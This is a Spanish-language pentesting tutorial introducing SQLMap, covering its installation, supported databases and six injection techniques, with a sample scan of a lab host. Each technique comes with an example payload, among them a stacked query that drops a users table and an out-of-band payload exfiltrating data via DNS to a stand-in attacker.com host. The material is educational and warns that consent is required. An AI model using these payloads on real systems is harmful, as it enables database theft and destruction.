
# SQLMap

{% hint style="danger" %}
**Nota:** Este tipo de técnicas son muy invasivas, ya que vamos a ganar acceso a distintos sistemas, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

[SQLMap](https://github.com/sqlmapproject/sqlmap) es una herramienta de prueba de penetración gratuita y de código abierto escrita en Python que automatiza el proceso de detección y explotación de fallas de inyección SQL (SQLi). SQLMap se ha desarrollado de forma continua desde 2006 y aún se mantiene en la actualidad.

```shell-session
afsh4ck@kali$ sqlmap -u 'http://inlanefreight.htb/page.php?id=5'

       ___
       __H__
 ___ ___[']_____ ___ ___  {1.3.10.41#dev}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 12:55:56

[12:55:56] [INFO] testing connection to the target URL
[12:55:57] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[12:55:58] [INFO] testing if the target URL content is stable
[12:55:58] [INFO] target URL content is stable
[12:55:58] [INFO] testing if GET parameter 'id' is dynamic
[12:55:58] [INFO] confirming that GET parameter 'id' is dynamic
[12:55:59] [INFO] GET parameter 'id' is dynamic
[12:55:59] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[12:56:00] [INFO] testing for SQL injection on GET parameter 'id'
<...SNIP...>
```

SQLMap viene con un potente motor de detección, numerosas funciones y una amplia gama de opciones e interruptores para ajustar muchos aspectos del mismo, como:

|                                             |                               |                                                                      |
| ------------------------------------------- | ----------------------------- | -------------------------------------------------------------------- |
| Conexión de destino                         | Detección de inyección        | Toma de huellas dactilares                                           |
| Enumeración                                 | Mejoramiento                  | Detección y omisión de protección mediante scripts de "manipulación" |
| Recuperación de contenido de bases de datos | Acceso al sistema de archivos | Ejecución de los comandos del sistema operativo (SO)                 |

***

## <mark style="color:purple;">Instalación de SQLMap</mark>

SQLMap está preinstalado en la mayoría de los sistemas operativos enfocados en la seguridad, como Kali Linux o ParrotOS. SQLMap también se encuentra en las bibliotecas de muchas distribuciones de Linux. Por ejemplo, en Debian, se puede instalar con:

```shell-session
afsh4ck@kali$ sudo apt install sqlmap
```

Si queremos instalarlo manualmente, podemos utilizar el siguiente comando en la terminal de Linux o la línea de comandos de Windows:

```shell-session
afsh4ck@kali$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

Después de esto, SQLMap se puede ejecutar con:

```shell-session
afsh4ck@kali$ python sqlmap.py
```

***

## <mark style="color:purple;">Bases de datos compatibles</mark>

SQLMap es la herramienta de explotación de SQL con mayor compatibilidad con DBMS. SQLMap es totalmente compatible con los siguientes DBMS:

|                   |                      |                    |                        |
| ----------------- | -------------------- | ------------------ | ---------------------- |
| `MySQL`           | `Oracle`             | `PostgreSQL`       | `Microsoft SQL Server` |
| `SQLite`          | `IBM DB2`            | `Microsoft Access` | `Firebird`             |
| `Sybase`          | `SAP MaxDB`          | `Informix`         | `MariaDB`              |
| `HSQLDB`          | `CockroachDB`        | `TiDB`             | `MemSQL`               |
| `H2`              | `MonetDB`            | `Apache Derby`     | `Amazon Redshift`      |
| `Vertica`,`Mckoi` | `Presto`             | `Altibase`         | `MimerSQL`             |
| `CrateDB`         | `Greenplum`          | `Drizzle`          | `Apache Ignite`        |
| `Cubrid`          | `InterSystems Cache` | `IRIS`             | `eXtremeDB`            |
| `FrontBase`       |                      |                    |                        |

El equipo de SQLMap también trabaja para agregar y soportar nuevos DBMS periódicamente.

***

## <mark style="color:purple;">Tipos de inyección SQL admitidos</mark>

SQLMap es la única herramienta de pruebas de penetración que puede detectar y explotar correctamente todos los tipos de SQLi conocidos. Vemos los tipos de inyecciones SQL compatibles con SQLMap con el comando `sqlmap -hh`:

```shell-session
afsh4ck@kali$ sqlmap -hh
...SNIP...
  Techniques:
    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
```

Los caracteres técnicos `BEUSTQ` se refieren a lo siguiente:

* `B`: Boolean-based blind
* `E`: Error-based
* `U`: Union query-based
* `S`: Stacked queries
* `T`: Time-based blind
* `Q`: Inline queries

***

### Inyección SQL ciega basada en booleanos

Ejemplo de `Boolean-based blind SQL Injection`:

```sql
AND 1=1
```

SQLMap explota vulnerabilidades `Boolean-based blind SQL Injection` mediante la diferenciación de los resultados `TRUE` de la consulta `FALSE`, recuperando efectivamente 1 byte de información por solicitud. La diferenciación se basa en la comparación de las respuestas del servidor para determinar si la consulta SQL devolvió `TRUE` o `FALSE`. Esto abarca desde comparaciones difusas de contenido de respuesta sin procesar, códigos HTTP, títulos de página, texto filtrado y otros factores.

* `TRUE`: Los resultados generalmente se basan en respuestas que no tienen ninguna diferencia o tienen una diferencia marginal con respecto a la respuesta regular del servidor.
* `FALSE`: Los resultados se basan en respuestas que tienen diferencias sustanciales con respecto a la respuesta regular del servidor.
* `Boolean-based blind SQL Injection`: Se considera el tipo SQLi más común en aplicaciones web.

***

### Inyección SQL basada en errores

Ejemplo de `Error-based SQL Injection`:

```sql
AND GTID_SUBSET(@@version,0)
```

Si los errores `database management system`( `DBMS`) se devuelven como parte de la respuesta del servidor para cualquier problema relacionado con la base de datos, existe la posibilidad de que se puedan utilizar para llevar los resultados de las consultas solicitadas. En tales casos, se utilizan cargas útiles especializadas para el DBMS actual, que apuntan a las funciones que causan comportamientos incorrectos conocidos. SQLMap tiene la lista más completa de dichas cargas útiles relacionadas y cubre `Error-based SQL Injection` en los siguientes DBMS:

|                        |                      |                         |
| ---------------------- | -------------------- | ----------------------- |
| MySQL                  | PostgreSQL           | Oráculo                 |
| Servidor Microsoft SQL | Base de datos Sybase | Vertical                |
| IBM DB2                | pájaro de fuego      | Base de datos Monetaria |

Se considera que SQLi basado en errores es más rápido que todos los demás tipos, excepto el basado en consultas UNION, porque puede recuperar una cantidad limitada (por ejemplo, 200 bytes) de datos llamados "fragmentos" a través de cada solicitud.

***

### Consulta basada en UNION

Ejemplo de `UNION query-based SQL Injection`:

```sql
UNION ALL SELECT 1,@@version,3
```

Con el uso de `UNION`, generalmente es posible extender la consulta original (`vulnerable`) con los resultados de las sentencias inyectadas. De esta manera, si los resultados de la consulta original se representan como parte de la respuesta, el atacante puede obtener resultados adicionales de las sentencias inyectadas dentro de la respuesta de la página misma. Este tipo de inyección SQL se considera el más rápido, ya que, en el escenario ideal, el atacante podría extraer el contenido de toda la tabla de la base de datos de interés con una sola solicitud.

***

### Stacked Queries

Ejemplo de `Stacked Queries`:

```sql
; DROP TABLE users
```

El apilamiento de consultas SQL, también conocido como "piggy-backing", es la forma de inyectar sentencias SQL adicionales después de la vulnerable. En caso de que exista un requisito para ejecutar sentencias que no sean de consulta (por ejemplo `INSERT`, `UPDATE`o `DELETE`), la plataforma vulnerable debe admitir el apilamiento (por ejemplo, `Microsoft SQL Server` y `PostgreSQL` admitirlo de forma predeterminada). SQLMap puede usar dichas vulnerabilidades para ejecutar sentencias que no sean de consulta ejecutadas en funciones avanzadas (por ejemplo, ejecución de comandos del sistema operativo) y recuperación de datos de manera similar a los tipos SQLi ciegos basados ​​en tiempo.

***

### Inyección SQL ciega basada en tiempo

Ejemplo de `Time-based blind SQL Injection`:

```sql
AND 1=IF(2>1,SLEEP(5),0)
```

El principio de `Time-based blind SQL Injection` es similar al de `Boolean-based blind SQL Injection`, pero aquí se utiliza el tiempo de respuesta como fuente para la diferenciación entre `TRUE` o `FALSE`.

* `TRUE`: La respuesta generalmente se caracteriza por la notable diferencia en el tiempo de respuesta en comparación con la respuesta del servidor normal.
* `FALSE`: La respuesta debe dar como resultado un tiempo de respuesta indistinguible de los tiempos de respuesta normales.

`Time-based blind SQL Injection` es considerablemente más lento que el SQLi ciego basado en booleanos, ya que las consultas resultantes `TRUE` retrasarían la respuesta del servidor. Este tipo de SQLi se utiliza en casos en los que `Boolean-based blind SQL Injection`no es aplicable. Por ejemplo, en caso de que la sentencia SQL vulnerable sea una no consulta (por ejemplo `INSERT`, , `UPDATE`o `DELETE`), ejecutada como parte de la funcionalidad auxiliar sin ningún efecto en el proceso de representación de la página, se utiliza SQLi basado en tiempo por necesidad, ya que `Boolean-based blind SQL Injection`realmente no funcionaría en este caso.

***

### Consultas en línea

Ejemplo de `Inline Queries`:

```sql
SELECT (SELECT @@version) from
```

Este tipo de inyección incorpora una consulta dentro de la consulta original. Este tipo de inyección SQL es poco común, ya que requiere que la aplicación web vulnerable esté escrita de una determinada manera. Aun así, SQLMap también admite este tipo de inyección SQL.

***

### Inyección SQL fuera de banda

Ejemplo de `Out-of-band SQL Injection`:

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

Este se considera uno de los tipos más avanzados de SQLi, utilizado en casos en los que la aplicación web vulnerable no admite todos los demás tipos o son demasiado lentos (por ejemplo, SQLi a ciegas basado en tiempo). SQLMap admite SQLi fuera de banda a través de "exfiltración de DNS", donde las consultas solicitadas se recuperan a través del tráfico de DNS.

Al ejecutar SQLMap en el servidor DNS del dominio bajo control (por ejemplo, `.attacker.com`), SQLMap puede realizar el ataque al obligar al servidor a solicitar subdominios inexistentes (por ejemplo, `foo.attacker.com`), donde `foo`estaría la respuesta SQL que queremos recibir. SQLMap puede luego recopilar estas solicitudes DNS con errores y recopilar la `foo`parte para formar la respuesta SQL completa.
